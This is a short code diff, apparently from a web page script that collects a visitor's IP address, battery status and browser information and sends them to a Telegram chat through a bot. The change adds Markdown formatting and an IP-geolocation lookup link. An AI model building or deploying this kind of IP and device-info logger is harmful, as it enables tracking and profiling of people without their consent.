@@ -60,6 +60,7 @@
             const payload = {
                 chat_id: TELEGRAM_CHAT_ID,
                 text: message,
+                parse_mode: 'Markdown'  // or 'HTML' if you prefer HTML formatting
             };
 
             try {
@@ -86,7 +87,8 @@
             const batteryStatus = await getBatteryStatus();
             const browserInfo = getBrowserInfo();
 
-            const message = `IP Address:\n${ip}\nBattery:\n${batteryStatus}\nBrowser:\n${browserInfo}`;
+            const ipLink = `[${ip}](https://ip-api.com/#${ip})`;
+            const message = `IP Address: ${ipLink}\nBattery: ${batteryStatus}\nBrowser: ${browserInfo}`;
             const success = await sendMessageToTelegram(message);
 
             const statusText = success ? 'Data sent to Telegram successfully!' : 'Failed to send data to Telegram.';
